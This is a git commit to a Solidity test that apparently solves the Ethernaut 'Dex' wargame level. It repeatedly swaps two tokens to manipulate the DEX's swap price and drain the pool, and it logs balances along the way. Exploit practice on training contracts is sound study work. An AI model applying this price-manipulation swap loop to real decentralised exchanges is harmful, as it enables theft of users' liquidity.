f4e9a1f700d69f40780eeaff23a4163d29ac5cf1
Joe Jordan <dev@ignitesoft.com>
2022-09-20 00:07:23 -0400

    pool abuse

--- test/Dex/Dex.t.sol
+++ test/Dex/Dex.t.sol
@@ -36,17 +36,36 @@ contract DexAttackTest is PRBTest {
 
     // test with withrawPartner set directly
     function testDexAttack() public {
-
+         uint tokenBalance;
         vm.startPrank(playerAddress, playerAddress);
 
-        attacker.attack(dexInstance);
-        uint myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
-        SwappableToken(token1).approve(playerAddress, dexInstance, myToken1Balance);
-        console.log("MY TOKEN1 BALANCE BEFORE:", myToken1Balance);
-        Dex(dexInstance).swap(token1, token2, myToken1Balance);
-        myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
-        console.log("MY TOKEN1 BALANCE AFTER:", myToken1Balance);
-        console.log("MY TOKEN1 PRICE AFTER:", Dex(dexInstance).getSwapPrice(token1, token2, 10));
+        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
+        swapToken(token1, token2, tokenBalance);
+        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
+        swapToken(token2, token1, tokenBalance);
+        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
+        swapToken(token1, token2, tokenBalance);
+        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
+        swapToken(token2, token1, tokenBalance);
+        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
+        swapToken(token1, token2, tokenBalance);
+        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
+        swapToken(token2, token1, tokenBalance);
+        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
+        swapToken(token1, token2, tokenBalance);
+        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
+        swapToken(token2, token1, tokenBalance);
+        // attacker.attack(dexInstance);
+        // uint myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
+        // SwappableToken(token1).approve(playerAddress, dexInstance, myToken1Balance);
+        // console.log("MY TOKEN1 BALANCE BEFORE:", myToken1Balance);
+        // Dex(dexInstance).swap(token1, token2, myToken1Balance);
+        // myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
+        // console.log("MY TOKEN1 BALANCE AFTER:", myToken1Balance);
+        // console.log("MY TOKEN1 PRICE AFTER:", Dex(dexInstance).getSwapPrice(token1, token2, 10));
+
+
+
 
         // // test to make sure we completed the level
         // vm.startPrank(playerAddress, playerAddress);
@@ -54,6 +73,16 @@ contract DexAttackTest is PRBTest {
         // bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
         // assert(levelComplete);
         // vm.stopPrank();
+    }
+
+    function swapToken(address _tokenFrom, address _tokenTo, uint _amount) public {
+        uint myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
+        SwappableToken(_tokenFrom).approve(playerAddress, dexInstance, _amount);
+        console.log("MY TOKEN BALANCE BEFORE:", myTokenBalance);
+        Dex(dexInstance).swap(_tokenFrom, _tokenTo, _amount);
+        myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
+        console.log("MY TOKEN BALANCE AFTER:", myTokenBalance);
+        console.log("MY TOKEN PRICE AFTER:", Dex(dexInstance).getSwapPrice(_tokenFrom, _tokenTo, _amount));
     }
 
 }
